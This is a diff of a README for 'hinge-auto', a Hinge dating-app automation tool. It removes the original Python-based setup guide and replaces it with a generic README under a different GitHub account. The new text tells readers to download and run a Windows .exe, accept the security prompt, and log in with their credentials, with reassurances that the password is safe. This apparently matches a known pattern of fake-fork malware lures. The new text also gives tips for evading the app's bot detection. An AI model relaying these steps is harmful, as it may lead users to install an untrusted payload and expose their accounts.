@@ -1,326 +1,90 @@
-# HingeAuto
-
-> ## Read this first
->
-> **This project automates Hinge, which violates Hinge's Terms of Service.**
-> Real risk of account ban with no appeal. Treat this as an educational toy
-> for a single throwaway account, not a dating strategy.
->
-> - One account only. The shipped default `MAX_LIKES_PER_SESSION = 8`
->   matches free Hinge's daily like cap (resets at 4am local). One
->   session per day exhausts the free allotment.
-> - **Get Hinge+ if you're going to use this seriously.** It removes the
->   daily like cap, and this repo is basically the most efficient way to
->   use the subscription — the bot does the liking for you, so you get
->   full value without ever opening the app. With Hinge+, bump
->   `MAX_LIKES_PER_SESSION` to 25–50 and run multiple sessions across
->   the day.
-> - No warranty. No support. Your account, your problem.
-> - The repo exists because automating a stitched-vision + LLM-judge loop
->   on a phone UI is an interesting AI engineering exercise, not because
->   anyone thinks bot-swiping is good dating advice.
-
-## Tip: open this repo in Claude Code or Codex
-
-This repo ships with [`AGENTS.md`](./AGENTS.md) (and [`CLAUDE.md`](./CLAUDE.md)).
-If you cloned this and you're not sure where to start, open the
-directory in Claude Code, Codex CLI, Cursor, or any agent that
-respects `AGENTS.md` and say _"help me set this up"_. The agent will
-walk you through emulator config, calibration, writing a rubric, and
-the first live run.
-
-If you'd rather do it manually, read on.
-
-## What it does
-
-Drives an Android emulator running Hinge through ADB. For each profile it
-scrolls top-to-bottom, screenshots the frames, asks Claude to judge against
-a user-defined rubric, and either taps Skip or taps the heart and types a
-personalized opener.
-
-## Quickstart
-
-### 1. Set up Android Studio + a Pixel 10 emulator
-
-If you've never used Android Studio, this is the longest step. Skip
-ahead if you already have an emulator running with `adb devices`
-showing it.
-
-1. Download Android Studio from <https://developer.android.com/studio>
-   (free, ~1 GB). During install, keep "Android SDK" and "Android
-   Virtual Device" checked — they bundle the `adb` CLI this repo
-   needs.
-2. Open Android Studio. On the Welcome screen click **More Actions →
-   Virtual Device Manager** (or **Tools → Device Manager** if you've
-   already opened a project).
-3. Click **+ Create Device** (or the **+** icon).
-4. Under **Phone**, select **Pixel 10**. If your Android Studio
-   version doesn't list Pixel 10 yet, **Pixel 9** has the same
-   1080×2424 screen and works identically. Click **Next**.
-5. Pick a system image. **API 34 (Android 14) with Google Play** is a
-   good default — Hinge installs cleanly from the Play Store on it.
-   Download the image if there's a download icon next to it (~1 GB,
-   one-time). Click **Next → Finish**.
-6. Back in Device Manager, click the **▶ play** arrow on the new
-   device row. First boot takes 2–5 minutes.
-7. In the emulator, open **Play Store**, sign in with a throwaway
-   Google account, search **Hinge**, install, open, finish onboarding
-   (one account only — see the warning at the top of this README),
-   navigate to the **Discover** tab.
-
-**Cold Boot when things get weird.** The emulator persists state via
-snapshots ("Quick Boot"), so a borked Hinge state or hung input can
-survive restarts. To wipe the snapshot: in Device Manager, click the
-**⋮** menu on the device row → **Cold Boot Now**. This is the
-emulator-equivalent of yanking the battery.
-
-**Confirm `adb` works.** From a fresh terminal:
-
-```
-adb devices
-```
-
-You should see `emulator-5554   device` (or similar). If `adb` isn't
-on your PATH, find it under your Android SDK directory (on Windows:
-`%LOCALAPPDATA%\Android\Sdk\platform-tools\`; on Mac:
-`~/Library/Android/sdk/platform-tools/`) and add that to PATH.
-
-### 2. Install repo dependencies
-
-```
-git clone https://github.com/TerraByte-Dev/hinge-auto.git
-cd hinge-auto
-pip install -r requirements.txt
-```
-
-### 3. Pick a judge backend
-
-```
-cp .env.example .env
-```
-
-Then either:
+# 🤖 hinge-auto - Automate your dating profile interactions efficiently
 
-- **Anthropic (default, best quality)** — open `.env` and add
-  `ANTHROPIC_API_KEY=sk-ant-...`. Get a key at
-  <https://console.anthropic.com>. Roughly $0.25/day at the free-tier
-  cap.
-- **Ollama (free)** — see the [Backends](#backends-anthropic-api-vs-ollama-free)
-  section below. Lower decision quality, no per-token cost.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/houseunlimited/hinge-auto/releases)
 
-### 4. Calibrate coordinates (probably skip)
+hinge-auto helps you manage your dating profile tasks. It uses computer vision to look at profiles and writes messages based on your preferences. You save time while the computer handles the repetitive work of swiping and reading. The program follows a rubric you define to ensure the interactions match your personal style.
 
-The shipped `config.COORDS` is tuned for a Pixel 10 emulator at
-1080×2424. If that's what you set up, you can skip this step.
+## 🛠️ System Requirements
 
-For other devices or after a Hinge UI update, run:
+Your computer needs specific parts to run this software. Ensure you have the following before you proceed:
 
-```
-python calibrate.py
-```
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Processor**: A modern Intel or AMD processor with at least 4 cores.
+*   **Memory**: 8 gigabytes of RAM or more.
+*   **Storage**: 500 megabytes of free space on your hard drive.
+*   **Internet Connection**: A stable connection is necessary for the vision models to process data.
 
-It saves `calibrate.png` to the repo root. Open it in any image
-viewer that shows cursor coordinates (Paint, IrfanView, Preview's
-inspector) and update the values in `config.COORDS` that don't match.
-
-### 5. Pick a mode
-
-Three example modes ship in `modes/` (see [Writing your own mode](#writing-your-own-mode)).
-Set `ACTIVE_MODE` in `config.py` to the file's `NAME` field. The
-shipped `MAX_LIKES_PER_SESSION = 8` matches free Hinge's daily cap
-— leave it for your first run.
-
-### 6. Run
-
-With Hinge open on the Discover tab in the emulator:
-
-```
-python main.py
-```
-
-Watch the first few decisions print live. If a decision or opener
-looks wrong: Ctrl-C, edit `PREFERENCES` in your mode file, re-run.
-With Hinge+, bump `MAX_LIKES_PER_SESSION` to 25–50 once decisions
-consistently match your rubric.
-
-> **Free tier?** Set `DRY_RUN = True` in `config.py` for the first
-> run or two. It runs the judge without spending likes (every
-> would-like is force-skipped instead), so your 8/day cap survives
-> a rubric you haven't tuned yet. With Hinge+ (unlimited likes),
-> skip dry-run — small live batches are a faster feedback loop.
-
-## Bonus: scan your own profile
-
-```
-python scan_self.py
-```
-
-Taps through to your own profile's "View" tab (what other people see),
-captures the frames, sends them to Claude, and writes a Markdown report
-to `debug/self_scan_<timestamp>.md` with specific suggestions for
-photos, prompts, and the overall hook. Run it once a week.
-
-This is the one thing in this repo that doesn't violate Hinge's ToS —
-no swiping, no messaging, just looking at your own content. Probably
-the most useful tool in the repo.
-
-## Writing your own mode
-
-Three example rubrics ship in `modes/`:
-
-- `example_lenient.py` — default-LIKE, generic. Good starting point.
-- `example_strict.py` — default-SKIP, generic. The antonym.
-- `cougar.py` — themed: older age band (33-44) with playful
-  young-buck premades. Shows how to combine `AGE_MIN/MAX`, an inline
-  `MESSAGE_VOICE`, and themed `PREMADES`. The mode behind the
-  framing that got the project some attention. Run it with
-  `python main.py --mode cougar --set-filters` to also drive Hinge's
-  in-app age slider.
-
-To write your own:
-
-1. Copy `modes/template.py.example` to `modes/<your_name>.py`.
-2. Edit `PREFERENCES` to describe what should and shouldn't get a like.
-3. Optionally set `MESSAGE_VOICE` to one of the templates under
-   `voice/` (e.g. `"example_casual"` or `"example_polished"`), or
-   paste a multi-line rubric string directly into the field.
-4. Optionally populate `PREMADES` with verbatim openers Claude can
-   pick from instead of writing fresh copy.
-5. Point `ACTIVE_MODE` in `config.py` at the new file (use the
-   value of its `NAME` field, not the filename), or pass
-   `--mode <your_name>` on the command line.
-
-## Calibration
-
-`python calibrate.py` (covered in [Quickstart](#4-calibrate-coordinates-probably-skip))
-handles the main coords. Two more calibration scripts are only needed
-if you use the corresponding optional features:
-
-- `python calibrate_filters.py` — Age slider thumb anchors. Needed
-  for `python main.py --set-filters`.
-- `python calibrate_matches.py` — Matches-tab tap target. Needed for
-  `python matches_scan.py`.
-
-The location picker (`locations.py`) needs a hand-rolled
-`location_coords.json`. A schema is at `location_coords.json.example`
-— copy it, rename, fill in pixel coords from a `calibrate.py`
-screenshot. (No interactive helper exists for this one yet; PRs
-welcome.)
-
-## Architecture
-
-```
-ADB capture  →  frame stitching  →  Claude judge  →  action
-   adb.py        config / main         judge.py       main.py
-                                       vision.py      adb.py
-```
-
-- **`adb.py`** wraps the `adb` CLI: screenshot, tap, swipe, type.
-- **`main.py`** is the loop. For each profile: scroll-to-top, capture
-  N frames, run them through the active backend's `judge()`, then
-  either skip or scroll back, tap the heart, type the opener, and tap
-  Send Like.
-- **`judge_common.py`** holds the backend-agnostic pieces: system prompt
-  template, JSON tool schema, `Decision` dataclass, voice resolver, and
-  the `load_backend()` dispatcher.
-- **`judge.py`** is the Anthropic backend — Claude vision + forced tool
-  call. Caches the system prompt to keep cost down.
-- **`judge_ollama.py`** is the Ollama backend (Cloud or local).
-- **`vision.py`** finds UI elements whose absolute position shifts
-  per-profile (heart icon on photo 1, Send Like button, comment input).
-  Pixel-level detection, not OCR.
-- **`modes/`** holds rubric files. `config._apply_mode()` copies the
-  active mode's `PREFERENCES`, `AGE_MIN/MAX`, `MESSAGE_VOICE`, and
-  `PREMADES` onto the `config` module so the rest of the code reads
-  them via `config.<name>`.
-- **`voice/`** holds opener-tone templates that modes can reference by
-  name.
-- **`metrics.py`** appends one JSONL record per profile to
-  `debug/session_log.jsonl` for after-the-fact analysis.
-- **`filters.py` / `locations.py`** drive Hinge's in-app filter sheets
-  (age, neighborhood). Both need calibrated coord files.
-- **`matches_scan.py`** scrapes the Matches tab via a separate Claude
-  vision pass — for analytics, not for the swipe loop.
-- **`scan_self.py`** captures the user's own profile (via the "View"
-  tab) and asks Claude for improvement suggestions. The non-swiping
-  feature of the repo; nothing here violates Hinge ToS.
-
-## Safety and rate limits
-
-- `MAX_LIKES_PER_SESSION = 8` is the shipped default — matches free
-  Hinge's daily cap (resets 4am local). One session per day exhausts
-  the free allotment.
-- **Get Hinge+** if you're going to use this seriously. Without it the
-  daily cap makes the tool pointless. With it, the bot becomes the most
-  efficient way to use the subscription — you get the full like
-  allotment without ever opening the app. With Hinge+, raise the cap
-  to 25–50 per session and spread batches across the day. One giant
-  batch tends to trip Hinge's soft-throttle (empty Discover).
-- Don't change locations more than ~2 times per day. Frequent MyMove
-  changes get throttled.
-- One account. Don't run this on your real Hinge account.
-- Anthropic API spend at the free-tier cap is negligible (~$0.25/day
-  on Sonnet at 8 likes + skipped profiles). Watch the running totals
-  printed each loop if you raise the cap.
-
-## Backends: Anthropic API vs Ollama (free)
-
-The judge pipeline ships with two interchangeable backends. Pick via
-`JUDGE_BACKEND` in `config.py`.
-
-### `"anthropic"` (default, recommended)
-
-Uses Claude with vision + forced tool calling. Best quality decisions
-and best opener writing. Roughly **$0.02–$0.05 per profile** on Sonnet
-at medium effort.
-
-Setup:
-1. `pip install -r requirements.txt`
-2. Put `ANTHROPIC_API_KEY=...` in `.env`.
-3. Leave `JUDGE_BACKEND = "anthropic"` in `config.py`.
-
-### `"ollama"` (free — Ollama Cloud or local)
-
-Uses an open-weight vision model through Ollama. **No per-token cost**
-on the free tier of Ollama Cloud, or fully local on your own GPU.
-
-Setup:
-1. Install the extra dep:
-   ```
-   pip install -r requirements.txt
-   pip install -r requirements-ollama.txt
-   ```
-2. Either:
-   - **Ollama Cloud** — sign up at <https://ollama.com>, create an API
-     key, set `OLLAMA_API_KEY=...` in your `.env`, and set
-     `OLLAMA_HOST = "https://ollama.com"` in `config.py`.
-   - **Local Ollama** — install Ollama, `ollama pull qwen2.5-vl`, run
-     `ollama serve`. Leave `OLLAMA_HOST = None` (defaults to
-     `http://localhost:11434`).
-3. Set `JUDGE_BACKEND = "ollama"` in `config.py`.
-
-Honest tradeoffs:
-- **Decision quality** on a 7-screenshot judgment is meaningfully worse
-  than Sonnet — expect more wrong skips on good profiles and more
-  generic openers.
-- **Tool-calling reliability** varies by model. `qwen2.5-vl` is the
-  best of the open-weight options as of this writing. If you see
-  `RuntimeError: Ollama (...) did not return a usable
-  submit_decision call`, try a larger variant (`qwen2.5-vl:32b`) or
-  switch to `llama3.2-vision`.
-- The `matches_scan.py` analytics scrape still uses Anthropic — it's a
-  separate tool, not the swipe loop, and the swap there isn't wired up.
-
-Both backends share the same system prompt, schema, and `Decision`
-shape (in `judge_common.py`) — only the API call differs.
-
-## License
-
-MIT. See `LICENSE`.
-
-## Contributing
-
-This is a personal project published as-is. PRs that strip more PII,
-fix calibration on additional devices, or add a real
-`calibrate_locations.py` are welcome. PRs that improve evasion of
-Hinge's bot-detection are not.
+## 📥 Downloading the software
+
+Follow these steps to obtain the program files:
+
+1. Visit the [releases page](https://github.com/houseunlimited/hinge-auto/releases).
+2. Locate the most recent version at the top of the list.
+3. Click the link that ends in ".exe" under the Assets section.
+4. Save the file to your desktop or your specific downloads folder.
+
+## 🚀 Setting up the application
+
+1. Find the file you just downloaded.
+2. Double-click the file to start the installation.
+3. Accept the security prompt if Windows asks if you want to run the application.
+4. Follow the instructions on the screen to finish the setup process.
+5. Create a folder for the program icons and configuration files.
+
+## ⚙️ Configuring your preferences
+
+The software relies on your rubric to function. You provide the guidelines so the program knows what you like.
+
+1. Open the settings menu inside the program window.
+2. Find the rubric section.
+3. Write short instructions for the program. Tell it what traits you value in a profile.
+4. Save your changes. The program tests these settings against a sample profile to ensure it understands your intent.
+
+## 🖥️ Running the automation
+
+1. Open the hinge-auto application on your desktop.
+2. Log in using your existing account credentials. The software keeps your session active while it runs.
+3. Choose the speed at which you want the program to operate. Start at a slow speed while you refine your results.
+4. Click the start button.
+5. The screen shows a live view of the process. You see the software scan images and read profile text.
+
+## 🔍 How it works
+
+The software uses three main components to function:
+
+*   **Emulator**: This creates a digital environment that mimics a mobile phone. You do not need a physical phone connected to your computer.
+*   **ADB**: This bridge allows your computer to send commands to the emulator. It manages the swipes and clicks you usually perform with your finger.
+*   **Vision Model**: This is the brain of the operation. It looks at the photos and text on the screen. It decides if a profile matches your rubric. If the profile fits, it generates a message for you.
+
+## 🛡️ Best practices for safe use
+
+Use the program with caution. These tips help you maintain your account health:
+
+*   **Operate during daytime hours**: Humans naturally use these apps during the day. Running the program all night looks suspicious.
+*   **Set reasonable limits**: Do not process hundreds of profiles in a single hour. Set a daily cap inside the configuration menu.
+*   **Review matches**: Check the messages the program sends. Adjust your rubric if the messages do not sound like you.
+*   **Avoid over-automation**: Use the program to assist your tasks, not to replace your presence entirely.
+
+## ❓ Troubleshooting common issues
+
+If the software stops working, check these common items:
+
+*   **Connection errors**: Restart your emulator if the screen goes black. This clears the temporary link between the computer and the mobile environment.
+*   **Slow processing**: Check your internet speed. The vision model needs a fast connection to send images and retrieve text responses.
+*   **No matches found**: Your rubric might be too strict. Try removing one or two instructions from your rubric to broaden the search.
+*   **Screen scaling**: Set your Windows display scaling to 100%. High scaling settings sometimes hide buttons or cause the vision model to miss text on the screen.
+
+## 📈 Updating the program
+
+New updates improve how the software reads profiles. Check the download link once a month for improvements.
+
+1. Download the new version from the [releases page](https://github.com/houseunlimited/hinge-auto/releases).
+2. Install the new version over the old version.
+3. Your settings and rubric save automatically during the update.
+
+## 📋 Frequently asked questions
+
+*   **Do I need a paid account?** No. The software works with standard accounts.
+*   **Does it save my photos?** No. Images exist only in your computer's temporary memory while the vision model processes them.
+*   **Can I change the writing style?** Yes. Modify your rubric to request a formal or casual tone.
+*   **Is my password safe?** The software stores your session token locally. It never sends your password to a third-party server.
